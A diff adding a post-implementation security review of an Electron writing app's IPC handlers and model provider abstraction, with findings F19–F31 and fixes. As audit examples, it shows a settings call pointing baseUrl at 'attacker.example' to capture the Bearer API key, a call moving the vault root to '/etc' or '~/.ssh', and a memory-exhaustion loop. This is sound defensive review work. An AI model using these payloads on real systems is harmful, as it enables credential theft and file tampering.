@@ -615,3 +615,287 @@ Per MYT-169 acceptance criteria, one HIGH finding is escalated:
 ---
 
 *Phase 3 threat model authored 2026-05-22 by SecurityEngineer (MYT-169). Child issue created for F10.*
+
+---
+
+# Phase 3 Post-Implementation Review — IPC Surface + Model-Agnostic Provider (MYT-351)
+
+**Date:** 2026-05-24
+**Reviewer:** SecurityEngineer
+**Scope:** IPC handlers landed since MYT-169 (Phase 3 batch) + model-agnostic provider abstraction (MYT-324). Read of `electron-main/src/{main,ipc,preload,provider,streaming,voice,archiveAgent,brainstormAgent,search,db,vault}.ts`.
+
+This review is the post-implementation follow-up trigger named in the Phase 3 Threat Model (see line ~423 above). It confirms the F10 mitigation landed in `brainstormAgent.ts`, but identifies new HIGH findings introduced by the provider abstraction and the Obsidian wizard, plus regressions of previously-fixed Electron hardening.
+
+---
+
+## What's working well in Phase 3
+
+- **Streaming payload validator (F19/F20 from MYT-167)** lands cleanly: payload size cap (256 KB), model allowlist, system-prompt size cap (16 KB), role/content type checks, `max_tokens` integer bounds — `streaming.ts:287-302`.
+- **Per-sender stream concurrency cap** enforced at `MAX_CONCURRENT_PER_SENDER = 4` (`streaming.ts:283-285`).
+- **Stream error categorization** never echoes raw SDK errors to the renderer; only the typed category + canned message (`streaming.ts:256-270, 75-87`).
+- **`destroyed` listener consolidated per-sender** (`streaming.ts:191-208`) — avoids the EventEmitter.maxListeners blow-up when raising the concurrent cap.
+- **F10 mitigation** (renderer-supplied `vaultPath`) landed in `brainstormAgent.ts:48-81` with the regex/`/`/`..`/`.mythos` checks named in MYT-169.
+- **F3 UUID guard** on `snapshotDir` is still in force.
+- **Suggestion `snapshotPath` now validated by `safePath`** at both APPLY (`main.ts:399-400`) and ROLLBACK (`main.ts:444`) — closes the rollback half of F4.
+- **All SQL goes through prepared statements with `?` placeholders.** The only dynamic SQL builder (`db.ts:385-395`) interpolates literal column-name fragments, never user data — params are always bound.
+- **Generation-log payload digests are SHA-256 by default**; raw prompt persistence is gated by `PERSIST_PROMPTS=1`.
+- **Renderer-supplied SQL channels (F1) remain removed.**
+
+## New findings
+
+### F19 — HIGH: `SETTINGS_GET` leaks `provider.apiKey` to renderer
+
+**Location:** `main.ts:664-666`
+```ts
+[IPC_CHANNELS.SETTINGS_GET]: (): AppSettings => {
+  const s = loadAppSettings();
+  return { ...s, apiKey: maskApiKey(s.apiKey) };
+},
+```
+MYT-324 introduced `settings.provider.apiKey` (`ipc.ts:717-725`) as a second key alongside the legacy `apiKey`. `SETTINGS_GET` only masks the legacy field; the provider key is returned verbatim through `{ ...s, apiKey: maskApiKey(s.apiKey) }`. The spread copies `provider.apiKey` unchanged.
+
+**Impact:** Direct regression of F2. Any successful renderer XSS that calls `window.api.settingsGet()` now reads the raw provider key (Anthropic / OpenAI / custom). Same severity rationale as the original F2 finding — closest path to secret exfiltration in the codebase.
+
+**Fix:**
+- Mask `provider.apiKey` in `SETTINGS_GET` the same way as the legacy key.
+- Apply the same round-trip guard in `SETTINGS_SET`: if the renderer echoes back the masked preview, preserve the stored key rather than overwriting with the mask.
+- Add a regression test in `api-key-leak.test.ts` covering `provider.apiKey`.
+
+**Owner:** BackendDev
+
+---
+
+### F20 — HIGH: Renderer-controlled `provider.baseUrl` exfiltrates API key to attacker-chosen URL
+
+**Location:** `provider.ts:78-118`, `main.ts:668-676` (`SETTINGS_SET`)
+
+`ProviderConfig.baseUrl` is a free-form string. `validateProviderConfig` (`provider.ts:180-195`) requires `baseUrl` only for `kind: 'custom'` but never validates protocol, hostname, or scheme. `SETTINGS_SET` writes whatever the renderer supplies straight to `app-settings.json` without validation. `runOpenAICompatibleStream` (`provider.ts:108-113`) then sends:
+```
+POST <baseUrl>/chat/completions
+Authorization: Bearer <apiKey>
+```
+
+A renderer compromise (XSS) can:
+1. Call `settingsSet` with `{ provider: { kind: 'custom', baseUrl: 'http://attacker.example/', apiKey: <stored>, model: '…' } }`. The stored `apiKey` is preserved if the renderer omits it or echoes the masked preview (depending on guard semantics) — but on first compromise the attacker can also read the masked key via F19 if the provider key is leaked verbatim.
+2. Trigger any agent that ends up calling `streamFromProvider` — the Bearer header carries the key to the attacker's host.
+3. Even without changing the key, a downgrade to `http://` ships the Bearer token in cleartext.
+
+Today `provider.ts` is not yet wired into any agent handler (see F26), so the attack only fires the moment the provider abstraction is wired in. **This is a latent HIGH that becomes active in the same PR that wires up the abstraction.** Filing now so the wiring change doesn't ship without the validator.
+
+**Fix:**
+- In `validateProviderConfig`: require `baseUrl` to be `https://` (allow `http://127.0.0.1` and `http://localhost` only for `kind: 'ollama' | 'lmstudio'`); reject hostnames outside an allowlist for `kind: 'openai'`/`'anthropic'` (lock to `api.openai.com` / `api.anthropic.com` — `kind` is the contract; renderer should not be able to redirect a "cloud OpenAI" provider to an arbitrary host).
+- In `SETTINGS_SET`: re-run `validateProviderConfig` on `settings.provider` and reject the write if it returns a non-null error.
+- Strip / re-encode the `apiKey` field to never appear inside the URL pathname.
+
+**Owner:** BackendDev + CTO (design call on local-endpoint allowlist)
+
+---
+
+### F21 — HIGH: `VAULT_OBSIDIAN_REGISTER` reassigns vault root from arbitrary renderer-supplied path
+
+**Location:** `main.ts:1106-1120`
+```ts
+[IPC_CHANNELS.VAULT_OBSIDIAN_REGISTER]: async (_payload) => {
+  const { sourcePath } = _payload;
+  saveVaultSettings({ vaultRoot: sourcePath }); // <-- no validation
+  ensureVaultDir();
+  …
+}
+```
+
+Unlike `VAULT_OPEN_FOLDER` which uses `dialog.showOpenDialog` to ensure the path was user-selected, `VAULT_OBSIDIAN_REGISTER` accepts the `sourcePath` directly from the IPC payload. A compromised renderer can call:
+```js
+window.api.obsidianRegister('/etc')
+// or '/Users/alice', '/home/alice/.ssh', etc.
+```
+This silently moves the vault root to that path. From that point on every `safePath()`-bound write (manuscript, manifest, snapshots, suggestion files, scene saves, EPUB export staging) operates *inside the attacker-chosen root*. `safePath` still prevents traversal outside that root, but the root itself is now an attacker-controlled location with no user gesture. `ensureVaultDir` may also `writeManifest` into the new root, clobbering whatever `manifest.json` already existed.
+
+**Impact:** Renderer compromise can use this to:
+- Overwrite system files reachable from the user's permissions (within the new root) via subsequent `vault:write`.
+- Read otherwise-private files into the manifest scan (next `VAULT_REINDEX` walks the new root).
+- Persist a malicious vault root that survives restarts.
+
+The wizard intent is clearly "user picked this folder via the picker before the dry-run". The contract just isn't enforced.
+
+**Fix:** Treat `VAULT_OBSIDIAN_REGISTER` (and `VAULT_OBSIDIAN_DRY_RUN`, and `VAULT_IMPORT`'s `sourcePath` per F6) as renderer input that must be confirmed by a main-process dialog before use. Two acceptable shapes:
+1. Tie registration to a one-shot token issued by `VAULT_PICK_FOLDER` (the dialog returns `{ vaultRoot, registrationToken }`; register requires the token; tokens expire after ~60s and after one use).
+2. Re-prompt with `dialog.showMessageBox` to confirm the path before persisting, with the path shown verbatim.
+
+Either way: never write `vaultRoot` from renderer-supplied input alone.
+
+**Owner:** BackendDev
+
+---
+
+### F22 — MEDIUM: `mythosIPC` legacy IPC bridge reinstated
+
+**Location:** `preload.ts:281-297`
+
+MYT-167 Electron Hardening (line ~309 above) removed the `mythosIPC` bridge because no `frontend/src` code referenced it and it doubled the IPC surface. It has been re-introduced. The same rationale applies: there are no callers in `frontend/src` (verify with `grep -rn "window.mythosIPC" frontend/src` before removal); the bridge re-exposes the legacy AI stub channels (`ai:brainstormer`, `ai:writing-assistant`, `ai:archive`) which are stubs and don't even share a typed schema with the renderer.
+
+**Fix:** Re-remove `mythosIPC`. If a Phase 3 piece accidentally added a dependency, port that caller to `window.api.*` instead of re-broadening the bridge.
+
+**Owner:** FrontendDev / BackendDev
+
+---
+
+### F23 — MEDIUM: `voice.openaiApiKey` returned verbatim by `SETTINGS_GET`
+
+**Location:** `ipc.ts:707-711` (`VoiceSettings.openaiApiKey`) + `main.ts:664-666` (`SETTINGS_GET`)
+
+A second API key (OpenAI for Whisper cloud fallback) is persisted in `app-settings.json` and returned by `SETTINGS_GET` unmasked. Same regression of F2 as F19 above. The renderer needs to know *whether a key is configured* and possibly a last-4 preview; it never needs the full key.
+
+**Fix:** Add masking + round-trip preservation for `voice.openaiApiKey` in `SETTINGS_GET`/`SETTINGS_SET` alongside the F19 fix. Same test pattern.
+
+**Owner:** BackendDev
+
+---
+
+### F24 — MEDIUM: `AGENT_VAULT_CHECK` bypasses the call budget
+
+**Location:** `main.ts:1918-2039`
+
+`registerBrainstormHandler` (`main.ts:1679`) and `registerWritingAssistantHandler` (`main.ts:1789`) both call `checkCallBudget(agent, settings, db)` before making the SDK call and emit `AGENT_BUDGET_CAP` on the cap-hit. `AGENT_VAULT_CHECK` does neither — it goes straight to `getValidatedApiKey()` and `client.messages.stream()`. A renderer in a tight loop can fire `agent:vault-check` and run through the token quota in the time it takes for the audit/log telemetry to catch up.
+
+**Fix:** Add the same `checkCallBudget('archive', settings.agents.archive, getDb())` gate at the top of the vault-check handler, with the matching `AGENT_BUDGET_CAP` push on miss. Cross-references MYT-169 finding F14 (rate limiting).
+
+**Owner:** BackendDev
+
+---
+
+### F25 — MEDIUM: `voice:audio-chunk` has no per-session, per-sender, or aggregate size cap
+
+**Location:** `voice.ts:67-102, 148-157`
+
+`VoiceRegistry.addChunk` pushes a Buffer into `session.audioChunks` with no upper bound. There is no per-session size cap, no per-sender session count cap, and no overall registry size cap. A renderer in a loop (`for (let i=0; i<1e9; i++) voiceAudioChunk(sessionId, bigBuffer)`) can grow main-process memory without bound. Cloud STT also never enforces a maximum audio length before uploading to OpenAI (`transcribeWithWhisper` concats the full chunk array).
+
+**Fix:**
+- Per-session cap (e.g. 25 MB — Whisper API's documented file limit).
+- Per-renderer session-count cap (e.g. 2 concurrent voice sessions).
+- Drop chunks past the cap and emit `voice:error` so the renderer can recover.
+
+**Owner:** BackendDev
+
+---
+
+### F26 — MEDIUM: Streaming and agent handlers ignore the provider abstraction; key always routed to Anthropic
+
+**Location:** `streaming.ts:223` (`new Anthropic({ apiKey })`); `main.ts:1692, 1802, 1952, 2062` (each handler instantiates `new Anthropic({ apiKey })` directly with `getValidatedApiKey()`).
+
+MYT-324 added `provider.ts` with `streamFromProvider`, but nothing in `electron-main/` calls it. The user-facing `provider.kind` setting is therefore inert: regardless of "OpenAI/Ollama/LM Studio/custom" selection, every agent and every streaming call hits Anthropic. Security relevance:
+- Violates the IPC review checklist item "API key never sent to providers other than the configured one" by failing it from the opposite direction — the *configured* provider doesn't receive the key, the *hard-coded* one does.
+- Mismatches the renderer-visible setting and silently routes the key to the wrong service if the user thought they were on a local Ollama provider.
+- Combined with F19/F20: when the wiring lands, both findings must be fixed in the same PR or the wiring change becomes the trigger for live exfiltration.
+
+**Fix:** Either delete the unused provider abstraction (acceptable if MYT-324 was experimental and the product remains Anthropic-only) or wire it in correctly with F19/F20 mitigations as prerequisites. Track the F26+F19+F20 cluster as a single epic — landing any one in isolation makes the others worse.
+
+**Owner:** BackendDev + CTO
+
+---
+
+### F27 — MEDIUM: `getValidatedApiKey()` hard-codes `sk-ant-` prefix check
+
+**Location:** `main.ts:1666-1669`
+
+```ts
+if (!apiKey.startsWith('sk-ant-')) {
+  throw new Error('ANTHROPIC_API_KEY appears invalid (expected format: sk-ant-…). …');
+}
+```
+
+This will reject every non-Anthropic key the moment the provider abstraction is wired in (F26). It also makes the error message lie when the configured provider is OpenAI (the user typed an OpenAI key in good faith and gets an "ANTHROPIC_API_KEY" error). Defensive concern: lock the validator to the `provider.kind` so a user with a misconfigured provider doesn't end up with their OpenAI key shipped to `api.anthropic.com` by `runAnthropicStream`.
+
+**Fix:** Rename to `getValidatedProviderConfig()`; return a `ProviderConfig` rather than a raw string; validate prefix per `kind` (`sk-ant-` for anthropic, `sk-` for openai, no prefix check for ollama/lmstudio/custom). Bundle with F26.
+
+**Owner:** BackendDev
+
+---
+
+### F28 — MEDIUM: `provider.ts` HTTP error path may echo upstream response body containing secrets
+
+**Location:** `provider.ts:115-118`
+```ts
+const text = await res.text().catch(() => '');
+throw Object.assign(new Error(`HTTP ${res.status}: ${text}`), { status: res.status });
+```
+
+For a misbehaving or hostile custom endpoint that echoes the `Authorization` header back in the response body (some proxy debug modes do), this surfaces the Bearer key into `err.message`. Today, `streaming.ts:262-269` only forwards a typed category to the renderer, so the leakage is bounded to `console.error` on the main process — but the same error is what `categorizeStreamError` reads via `msg.toLowerCase().includes('key')` to classify (`streaming.ts:67-68`), so a body containing the token can flip the user-facing message to "Authentication error", with the raw token persisting in process memory and on stderr.
+
+**Fix:** Cap the echoed body length (≤ 256 chars), and strip patterns matching `/sk-[a-z0-9_-]{8,}/i` and `/Bearer\s+[^\s"]+/i` before throwing. Defense in depth: never include response bodies from non-allowlisted hosts in the main-process console either.
+
+**Owner:** BackendDev
+
+---
+
+### F29 — LOW: `AGENT_VAULT_INDEX` rebuilds full entity index on every call without rate limit
+
+**Location:** `main.ts:1882-1915`
+
+The handler unconditionally runs `reindexEntities` + `listEntities` + per-entity `readVaultFile`. A renderer can call it in a loop and drive O(N) FS reads per call. No deduplication, no caching, no debounce.
+
+**Fix:** Use the existing `ArchiveIndex` cache (`archiveAgent.ts`) or add a TTL guard. Acceptable as LOW because (a) all I/O is local, (b) `MAX_CONCURRENT_PER_SENDER` doesn't apply here — this is not a streaming channel.
+
+**Owner:** BackendDev (low priority)
+
+---
+
+### F30 — LOW: `epub.ts` `escapedHtml` does not escape `'`
+
+**Location:** `epub.ts:33-39`
+
+The escaper handles `&`, `<`, `>`, `"` but not `'`. All current attribute usage in `epub.ts` uses double quotes (`href="…"`, `media-type="…"`) so present attack surface is nil. Future templating changes that use single-quoted attributes would inherit a bug — defense in depth.
+
+**Fix:** Add `.replace(/'/g, '&#39;')`. Net zero size; eliminates a footgun.
+
+**Owner:** BackendDev (low priority)
+
+---
+
+### F31 — LOW: `VAULT_GRAPH_DATA` reads every md file twice with no per-file size cap
+
+**Location:** `main.ts:923-981`
+
+The handler does `readVaultFile` once to build the node list (lines 937-947) and again to scan edges (lines 957-977). For large vaults this duplicates the I/O. There is also no per-file size cap — a single 50 MB markdown file is read entirely into memory twice.
+
+**Fix:** Cache `content` and `frontmatter` in the first pass; reuse them in the edge pass. Skip files > 1 MB (graph view doesn't need their prose).
+
+**Owner:** BackendDev (low priority)
+
+---
+
+## Phase 3 Findings Summary
+
+| ID | Channel(s) / Area | Severity | Status | Owner |
+|---|---|---|---|---|
+| F19 | `settings:get` (provider.apiKey) | **HIGH** | Open — child issue to file | BackendDev |
+| F20 | `settings:set` / `provider.baseUrl` | **HIGH** | Open — child issue to file | BackendDev + CTO |
+| F21 | `vault:obsidian-register` (also dry-run, import) | **HIGH** | Open — child issue to file | BackendDev |
+| F22 | `preload.ts` `mythosIPC` bridge | MEDIUM | Open | FrontendDev |
+| F23 | `settings:get` (voice.openaiApiKey) | MEDIUM | Open | BackendDev |
+| F24 | `agent:vault-check` | MEDIUM | Open | BackendDev |
+| F25 | `voice:audio-chunk` | MEDIUM | Open | BackendDev |
+| F26 | `streaming.ts`, all `agent:*` handlers | MEDIUM | Open — cluster with F19+F20+F27 | BackendDev + CTO |
+| F27 | `getValidatedApiKey()` | MEDIUM | Open | BackendDev |
+| F28 | `provider.ts` HTTP error path | MEDIUM | Open | BackendDev |
+| F29 | `agent:vault-index` | LOW | Open | BackendDev |
+| F30 | `epub.ts` `escapedHtml` | LOW | Open | BackendDev |
+| F31 | `vault:graph-data` | LOW | Open | BackendDev |
+
+### Inherited open findings (still applicable; cross-check)
+- **F4 / F12** (`snapshotPath` content scoping) — APPLY+ROLLBACK now run `safePath`, but neither restricts the path to `.mythos/suggestion-snapshots/`. Still open per MYT-169 F12. Recommend bundling with F19 cluster.
+- **F5** (FS paths leaked in error messages) — `setupIpcMain` (`ipc.ts:151-158`) still echoes `(error as Error).message`. Still open.
+- **F6** (`vault:import` unrestricted sourcePath) — same root cause as F21; suggest closing both under a single "renderer-supplied path requires user-gesture confirmation" fix.
+- **F13** (vault context cap on `agent:vault-check`) — `main.ts:1926-1938` still has no aggregate cap; concatenates entity prose unconditionally.
+- **F14** (rate limit on agent channels) — partially mitigated by per-sender stream cap, but the non-streaming `agent:vault-check` / `agent:vault-index` / `writing:scan` paths still have no concurrency guard.
+- **F16** (`actor` field spoofable) — still present at `main.ts:392, 410, 425, 459`.
+
+### Child issues created
+- **MYT-358** (F19): Mask `provider.apiKey` in `SETTINGS_GET`; preserve on round-trip.
+- **MYT-359** (F20): Validate `provider.baseUrl` (scheme + host allowlist) in `validateProviderConfig` and on `SETTINGS_SET`.
+- **MYT-360** (F21): Require user-gesture confirmation for renderer-supplied vault roots / import paths (covers F6 + F21).
+
+No P0 (RCE / direct unauthenticated exfiltration) findings. The three new HIGHs are all renderer-XSS-pivoted attacks — same trust model as F2.
+
+---
+
+*Phase 3 post-implementation review authored 2026-05-24 by SecurityEngineer (MYT-351). Child issues filed for F19, F20, F21.*
